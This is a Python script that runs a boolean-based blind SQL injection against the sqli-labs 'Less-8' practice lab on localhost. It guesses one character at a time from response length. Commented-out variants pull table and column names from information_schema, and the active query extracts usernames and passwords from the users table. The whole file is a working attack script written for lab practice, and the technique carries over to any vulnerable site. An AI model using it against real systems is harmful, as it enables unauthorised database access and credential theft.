#coding:utf-8
import requests

char = "abcdefghijklmnopqrstuvwxyz0123456789~*/\{}?!:@_-,"
namelen = 1024

name = ""

res = requests.get("http://localhost/sqli/Less-8/?id=1")
truelen = len(res.content)
for i in range(1, namelen):
    flag = True
    for str in char:
	#表名
    	#res = requests.get("http://localhost/sqli/Less-8/?id=1' and mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),%s,1)=%%27%s%%27 --+"%(i,str))
	#字段名
    	#res = requests.get("http://localhost/sqli/Less-8/?id=1' and mid((select group_concat(column_name) from information_schema.columns where table_name = 'users'),%s,1)=%%27%s%%27 --+"%(i,str))
	#字段值
    	res = requests.get("http://localhost/sqli/Less-8/?id=1' and mid((select group_concat(username,0x3a,password) from users),%s,1)=%%27%s%%27 --+"%(i,str))
    	if(len(res.content) == truelen):
	     name += str
	     print(str)
	     flag = False
	     break
    if(flag):break
print(name)

